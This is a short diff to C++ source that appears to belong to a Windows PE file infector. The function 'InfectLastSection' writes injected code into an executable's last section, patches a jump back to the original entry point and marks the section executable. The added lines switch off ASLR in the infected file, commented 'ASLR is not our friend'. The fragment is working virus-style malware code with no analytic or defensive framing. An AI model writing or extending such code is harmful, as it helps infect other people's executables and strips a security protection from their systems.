@@ -95,6 +95,8 @@ void PEFile::InfectLastSection(char const* code, size_t size, DWORD originalEntr
 	DWORD absoluteOEPAddr = m_ntHeaders->OptionalHeader.ImageBase + orignalEntryPoint; // absolute address of original entry point
 	memcpy(newCodePointer + originalEntryPointOffset, &absoluteOEPAddr, sizeof(DWORD));
 	lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
+
+	m_ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE; // ASLR is not our friend
 	ExpandLastSection(size);
 }
 void PEFile::InfectCreateNewSection(char const* sectionName, char const* code, size_t size, DWORD originalEntryPointOffset, DWORD newEntryPointOffset)
